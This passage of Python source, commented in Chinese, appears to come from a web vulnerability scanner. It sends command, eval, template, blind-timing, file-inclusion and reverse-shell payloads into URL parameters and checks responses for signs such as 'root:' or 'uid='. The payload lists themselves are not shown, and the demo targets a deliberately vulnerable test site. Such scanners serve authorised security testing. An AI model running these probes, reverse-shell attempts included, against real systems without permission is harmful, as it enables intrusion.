            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    indicators = self.code_indicators.get("php_output", [])
                    for indicator in indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Code Injection (Eval-Based)',
                                'payload': payload,
                                'language': language,
                                'confidence': '高',
                                'evidence': f"发现PHP输出: {indicator}",
                                'technique': 'PHP eval() execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试Python eval payloads
        for payload_info in self.code_payloads.get("python_eval", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    indicators = self.code_indicators.get("python_output", [])
                    for indicator in indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Code Injection (Eval-Based)',
                                'payload': payload,
                                'language': language,
                                'confidence': '高',
                                'evidence': f"发现Python输出: {indicator}",
                                'technique': 'Python eval()/exec() execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试Node.js eval payloads
        for payload_info in self.code_payloads.get("nodejs_eval", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    indicators = self.code_indicators.get("nodejs_output", [])
                    for indicator in indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Code Injection (Eval-Based)',
                                'payload': payload,
                                'language': language,
                                'confidence': '高',
                                'evidence': f"发现Node.js输出: {indicator}",
                                'technique': 'Node.js eval() execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_code_system_based(self, url, param_name, param_value, method, post_data):
        """基于系统调用的代码执行检测"""
        vulnerabilities = []
        
        # 测试PHP系统调用
        for payload_info in self.code_payloads.get("php_system", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查命令输出
                    command_indicators = ["COMMAND_TEST", "whoami", "root:", "uid=", "Administrator"]
                    for indicator in command_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Code Injection (System Call)',
                                'payload': payload,
                                'language': language,
                                'confidence': '高',
                                'evidence': f"发现系统命令输出: {indicator}",
                                'technique': 'PHP system()/exec() execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试Python系统调用
        for payload_info in self.code_payloads.get("python_os", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    command_indicators = ["COMMAND_TEST", "whoami", "root:", "uid=", "Administrator"]
                    for indicator in command_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Code Injection (System Call)',
                                'payload': payload,
                                'language': language,
                                'confidence': '高',
                                'evidence': f"发现系统命令输出: {indicator}",
                                'technique': 'Python os.system() execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试Java Runtime执行
        for payload_info in self.code_payloads.get("java_runtime", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查Java特定输出
                    java_indicators = self.code_indicators.get("java_output", [])
                    for indicator in java_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Code Injection (System Call)',
                                'payload': payload,
                                'language': language,
                                'confidence': '中',
                                'evidence': f"发现Java输出: {indicator}",
                                'technique': 'Java Runtime.exec() execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_code_template_injection(self, url, param_name, param_value, method, post_data):
        """模板注入检测"""
        vulnerabilities = []
        
        # 测试通用模板注入payloads
        for payload_info in self.code_payloads.get("generic_template", []):
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查模板计算结果
                    template_indicators = self.code_indicators.get("template_indicators", [])
                    for indicator in template_indicators:
                        if indicator in content:
                            vulnerabilities.append({
                                'type': 'Template Injection',
                                'payload': payload,
                                'language': language,
                                'confidence': '高',
                                'evidence': f"模板计算结果显示: {indicator}",
                                'technique': 'Template engine code execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试特定语言模板
        for payload_type in ["python_template", "java_template", "nodejs_template"]:
            for payload_info in self.code_payloads.get(payload_type, [])[:3]:
                payload = payload_info["payload"]
                language = payload_info["language"]
                context = payload_info["context"]
                
                try:
                    test_value = f"{param_value}{payload}"
                    response = self._send_code_test(url, param_name, test_value, method, post_data)
                    
                    if response:
                        content = response['response'].get('content', '')
                        if not isinstance(content, str):
                            content = str(content)
                        
                        if "49" in content or "7777777" in content:
                            vulnerabilities.append({
                                'type': 'Template Injection',
                                'payload': payload,
                                'language': language,
                                'confidence': '中',
                                'evidence': '模板表达式执行成功',
                                'technique': 'Template engine code execution',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                
                except Exception:
                    continue
        
        return vulnerabilities

    def detect_code_blind_injection(self, url, param_name, param_value, method, post_data):
        """盲注代码执行检测"""
        vulnerabilities = []
        
        # 测试时间盲注
        normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
        
        for payload_info in self.code_payloads.get("blind_time", [])[:3]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                response = self._send_code_test(url, param_name, test_value, method, post_data,
                                               timeout=self.time_delay_threshold + 5)
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time > self.time_delay_threshold:
                    vulnerabilities.append({
                        'type': 'Code Injection (Time-Based Blind)',
                        'payload': payload,
                        'language': language,
                        'confidence': '中',
                        'evidence': {
                            'normal_response_time': normal_time,
                            'delayed_response_time': elapsed_time,
                            'threshold': self.time_delay_threshold
                        },
                        'technique': 'Time delay execution',
                        'context': context
                    })
            
            except Exception as e:
                if "timeout" in str(e).lower():
                    vulnerabilities.append({
                        'type': 'Code Injection (Time-Based Blind - Timeout)',
                        'payload': payload,
                        'language': language,
                        'confidence': '中',
                        'evidence': '请求超时',
                        'technique': 'Request timeout',
                        'context': context
                    })
                continue
        
        return vulnerabilities

    def _send_code_test(self, url, param_name, param_value, method, post_data, timeout=None):
        """发送代码执行测试请求"""
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': {},
                'allow_redirects': True
            }
            
            if timeout:
                request_info['timeout'] = timeout
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            return self.send_controlled_request(request_info)
        except Exception as e:
            print(f"代码测试请求失败: {e}")
            return None

    # ==================== 主检测方法 ====================

    def check_command_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        全面的命令注入检测入口
        """
        if isinstance(url, list):
            if url:
                url = url[0]
            else:
                print(f"❌ 错误: url列表为空")
                return [], self.results

        if not isinstance(url, str):
            print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
            return [], self.results

        if not url.startswith(('http://', 'https://')):
            print(f"⚠️  警告: URL缺少协议，添加http://")
            url = f"http://{url}"

        print(f"\n🔍 开始全面检测命令注入: {url}")
        if param_name and param_value:
            print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")

        vulnerabilities = []

        try:
            # 获取基准响应
            baseline = self.get_baseline_response(url, param_name or "cmd", param_value or "test", method, post_data)

            print("\n[1/5] 基于回显的命令执行检测...")
            echo_results = self.detect_command_echo_based(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in echo_results])

            print("[2/5] 基于时间的命令执行检测...")
            time_results = self.detect_command_time_based(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in time_results])

            print("[3/5] 基于文件操作的命令执行检测...")
            file_results = self.detect_command_file_operations(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in file_results])

            print("[4/5] 盲注命令执行检测...")
            blind_results = self.detect_command_blind_injection(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in blind_results])

            print("[5/5] 反向Shell payload检测...")
            shell_results = self.detect_reverse_shell(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in shell_results])

            # 更新统计信息
            self.update_command_statistics(vulnerabilities)

            print(f"\n{'='*60}")
            print(f"命令注入扫描完成！")
            print(f"发现漏洞: {len(vulnerabilities)}")

            if vulnerabilities:
                print(f"\n漏洞详情:")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"{i}. URL: {vuln['url']}")
                    print(f"   类型: {vuln['type']}")
                    print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                    print(f"   方法: {vuln['method']}")
                    print(f"   可信度: {vuln['confidence']}")
                    print(f"   操作系统: {vuln.get('os', 'N/A')}")
                    if 'evidence' in vuln:
                        if isinstance(vuln['evidence'], dict):
                            print(f"   证据: {vuln['evidence']}")
                        else:
                            print(f"   证据: {vuln['evidence']}")

            # 更新全局结果
            self.results['vulnerabilities'].extend(vulnerabilities)

            return vulnerabilities, self.results

        except Exception as e:
            print(f"❌ 命令注入检测过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return [], self.results

    def check_code_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        全面的代码执行检测入口
        """
        if isinstance(url, list):
            if url:
                url = url[0]
            else:
                print(f"❌ 错误: url列表为空")
                return [], self.results

        if not isinstance(url, str):
            print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
            return [], self.results

        if not url.startswith(('http://', 'https://')):
            print(f"⚠️  警告: URL缺少协议，添加http://")
            url = f"http://{url}"

        print(f"\n🔍 开始全面检测代码注入: {url}")
        if param_name and param_value:
            print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")

        vulnerabilities = []

        try:
            # 获取基准响应
            baseline = self.get_baseline_response(url, param_name or "code", param_value or "test", method, post_data)

            print("\n[1/5] 基于eval的代码执行检测...")
            eval_results = self.detect_code_eval_based(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in eval_results])

            print("[2/5] 基于系统调用的代码执行检测...")
            system_results = self.detect_code_system_based(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in system_results])

            print("[3/5] 模板注入检测...")
            template_results = self.detect_code_template_injection(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in template_results])

            print("[4/5] 盲注代码执行检测...")
            blind_results = self.detect_code_blind_injection(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in blind_results])

            print("[5/5] 文件包含检测...")
            include_results = self.detect_file_inclusion(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in include_results])

            # 更新统计信息
            self.update_code_statistics(vulnerabilities)

            print(f"\n{'='*60}")
            print(f"代码注入扫描完成！")
            print(f"发现漏洞: {len(vulnerabilities)}")

            if vulnerabilities:
                print(f"\n漏洞详情:")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"{i}. URL: {vuln['url']}")
                    print(f"   类型: {vuln['type']}")
                    print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                    print(f"   方法: {vuln['method']}")
                    print(f"   可信度: {vuln['confidence']}")
                    print(f"   编程语言: {vuln.get('language', 'N/A')}")
                    if 'evidence' in vuln:
                        if isinstance(vuln['evidence'], dict):
                            print(f"   证据: {vuln['evidence']}")
                        else:
                            print(f"   证据: {vuln['evidence']}")

            # 更新全局结果
            self.results['vulnerabilities'].extend(vulnerabilities)

            return vulnerabilities, self.results

        except Exception as e:
            print(f"❌ 代码注入检测过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return [], self.results

    def detect_reverse_shell(self, url, param_name, param_value, method, post_data):
        """反向Shell payload检测"""
        vulnerabilities = []
        
        for payload_info in self.command_payloads.get("reverse_shell", [])[:3]:
            payload = payload_info["payload"]
            os_type = payload_info["os"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    # 反向shell通常不会有直接响应，但可以检查是否有异常行为
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查是否有连接相关的错误
                    error_indicators = [
                        "Connection refused",
                        "Connection timed out",
                        "No route to host",
                        "Network is unreachable"
                    ]
                    
                    for indicator in error_indicators:
                        if indicator in content:
                            vulnerabilities.append({
                                'type': 'Command Injection (Reverse Shell Attempt)',
                                'payload': payload,
                                'os': os_type,
                                'confidence': '中',
                                'evidence': f"反向Shell尝试: {indicator}",
                                'technique': 'Reverse shell connection',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_file_inclusion(self, url, param_name, param_value, method, post_data):
        """文件包含检测"""
        vulnerabilities = []
        
        for payload_info in self.code_payloads.get("php_include", [])[:3]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查文件包含的常见错误
                    include_indicators = [
                        "failed to open stream",
                        "No such file or directory",
                        "include_path",
                        "require_once",
                        "Failed opening"
                    ]
                    
                    for indicator in include_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'File Inclusion',
                                'payload': payload,
                                'language': language,
                                'confidence': '中',
                                'evidence': f"文件包含错误: {indicator}",
                                'technique': 'File include/require',
                                'context': context,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def _format_command_vulnerability(self, detection_result, url, param_name, method):
        """格式化命令执行漏洞结果"""
        if isinstance(detection_result, dict):
            vuln = detection_result.copy()
            vuln['url'] = url
            
            if 'parameter' not in vuln and param_name:
                vuln['parameter'] = param_name
            
            if 'method' not in vuln:
                vuln['method'] = method
            
            if 'type' not in vuln:
                vuln['type'] = 'Command Injection'
            
            if 'confidence' not in vuln:
                vuln['confidence'] = '中'
            
            return vuln
        else:
            return {
                'url': url,
                'type': 'Command Injection',
                'parameter': param_name or 'unknown',
                'method': method,
                'confidence': '中',
                'description': str(detection_result)
            }

    def _format_code_vulnerability(self, detection_result, url, param_name, method):
        """格式化代码执行漏洞结果"""
        if isinstance(detection_result, dict):
            vuln = detection_result.copy()
            vuln['url'] = url
            
            if 'parameter' not in vuln and param_name:
                vuln['parameter'] = param_name
            
            if 'method' not in vuln:
                vuln['method'] = method
            
            if 'type' not in vuln:
                vuln['type'] = 'Code Injection'
            
            if 'confidence' not in vuln:
                vuln['confidence'] = '中'
            
            return vuln
        else:
            return {
                'url': url,
                'type': 'Code Injection',
                'parameter': param_name or 'unknown',
                'method': method,
                'confidence': '中',
                'description': str(detection_result)
            }

    def update_command_statistics(self, vulnerabilities):
        """更新命令执行统计信息"""
        stats = self.results['command_statistics']
        
        if not vulnerabilities:
            return
        
        unique_urls = set()
        for vuln in vulnerabilities:
            if 'url' in vuln:
                unique_urls.add(vuln['url'])
            elif 'tested_url' in vuln:
                unique_urls.add(vuln['tested_url'])
        
        stats["total_tested"] = len(unique_urls)
        stats["vulnerable_urls"] = len(unique_urls)
        
        for vuln in vulnerabilities:
            vuln_type = vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
            stats["by_type"][vuln_type] = stats["by_type"].get(vuln_type, 0) + 1
            
            os_type = vuln.get("os", "unknown")
            stats["by_os"][os_type] = stats["by_os"].get(os_type, 0) + 1
            
            method = vuln.get("method", "unknown")
            stats["by_method"][method] = stats["by_method"].get(method, 0) + 1

    def update_code_statistics(self, vulnerabilities):
        """更新代码执行统计信息"""
        stats = self.results['code_statistics']
        
        if not vulnerabilities:
            return
        
        unique_urls = set()
        for vuln in vulnerabilities:
            if 'url' in vuln:
                unique_urls.add(vuln['url'])
            elif 'tested_url' in vuln:
                unique_urls.add(vuln['tested_url'])
        
        stats["total_tested"] = len(unique_urls)
        stats["vulnerable_urls"] = len(unique_urls)
        
        for vuln in vulnerabilities:
            vuln_type = vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
            stats["by_type"][vuln_type] = stats["by_type"].get(vuln_type, 0) + 1
            
            language = vuln.get("language", "unknown")
            stats["by_language"][language] = stats["by_language"].get(language, 0) + 1
            
            method = vuln.get("method", "unknown")
            stats["by_method"][method] = stats["by_method"].get(method, 0) + 1

    def evaluate_command_results(self, vulnerabilities):
        """评估命令执行检测结果"""
        if not vulnerabilities:
            return {
                'vulnerable': False,
                'confidence': '无',
                'summary': '未检测到命令注入漏洞'
            }
        
        confidence_map = {'高': 3, '中': 2, '低': 1}
        
        total_weight = 0
        total_confidence = 0
        
        for vuln in vulnerabilities:
            weight = confidence_map.get(vuln.get('confidence', '低'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(vuln['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        if avg_confidence >= 2.5:
            verdict = '确认存在漏洞'
            confidence = '高'
        elif avg_confidence >= 1.5:
            verdict = '很可能存在漏洞'
            confidence = '中'
        else:
            verdict = '可能存在漏洞'
            confidence = '低'
        
        vuln_types = set(r['type'] for r in vulnerabilities)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(vulnerabilities),
            'details': vulnerabilities
        }

    def evaluate_code_results(self, vulnerabilities):
        """评估代码执行检测结果"""
        if not vulnerabilities:
            return {
                'vulnerable': False,
                'confidence': '无',
                'summary': '未检测到代码注入漏洞'
            }
        
        confidence_map = {'高': 3, '中': 2, '低': 1}
        
        total_weight = 0
        total_confidence = 0
        
        for vuln in vulnerabilities:
            weight = confidence_map.get(vuln.get('confidence', '低'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(vuln['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        if avg_confidence >= 2.5:
            verdict = '确认存在漏洞'
            confidence = '高'
        elif avg_confidence >= 1.5:
            verdict = '很可能存在漏洞'
            confidence = '中'
        else:
            verdict = '可能存在漏洞'
            confidence = '低'
        
        vuln_types = set(r['type'] for r in vulnerabilities)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(vulnerabilities),
            'details': vulnerabilities
        }

    def scan_all_vulnerabilities(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        扫描所有漏洞类型（命令执行 + 代码执行）
        """
        print(f"\n{'='*60}")
        print(f"开始全面漏洞扫描: {url}")
        print(f"{'='*60}")
        
        all_vulnerabilities = []
        
        # 扫描命令注入
        cmd_results, _ = self.check_command_injection(url, param_name, param_value, method, post_data)
        all_vulnerabilities.extend(cmd_results)
        
        # 扫描代码注入
        code_results, _ = self.check_code_injection(url, param_name, param_value, method, post_data)
        all_vulnerabilities.extend(code_results)
        
        # 生成报告
        print(f"\n{'='*60}")
        print(f"扫描完成！")
        print(f"总共发现漏洞: {len(all_vulnerabilities)}")
        print(f"命令注入漏洞: {len(cmd_results)}")
        print(f"代码注入漏洞: {len(code_results)}")
        
        if all_vulnerabilities:
            print(f"\n漏洞汇总:")
            for i, vuln in enumerate(all_vulnerabilities, 1):
                print(f"{i}. [{vuln['type']}] {vuln.get('url', 'N/A')}")
                print(f"   参数: {vuln.get('parameter', 'N/A')} | 方法: {vuln.get('method', 'N/A')}")
                print(f"   可信度: {vuln.get('confidence', 'N/A')}")
                if 'evidence' in vuln:
                    if isinstance(vuln['evidence'], dict):
                        print(f"   证据: {list(vuln['evidence'].keys())}")
                    else:
                        print(f"   证据: {vuln['evidence'][:100]}...")
                print()
        
        return all_vulnerabilities, self.results

# ==================== 使用示例 ====================
if __name__ == "__main__":
    scanner = CommandCodeScanner()
    
    # 测试URL示例
    test_urls = [
        "http://testphp.vulnweb.com/artists.php?artist=1",
        "http://testphp.vulnweb.com/categories.php?cat=1"
    ]
    
    for url in test_urls:
        print(f"\n{'='*60}")
        print(f"开始扫描: {url}")
        
        # 扫描命令注入
        cmd_vulns, cmd_results = scanner.check_command_injection(url, "artist", "1")
        
        # 扫描代码注入
        code_vulns, code_results = scanner.check_code_injection(url, "artist", "1")
        
        if not cmd_vulns and not code_vulns:
            print(f"未发现命令执行或代码执行漏洞")
        else:
            print(f"发现 {len(cmd_vulns) + len(code_vulns)} 个漏洞")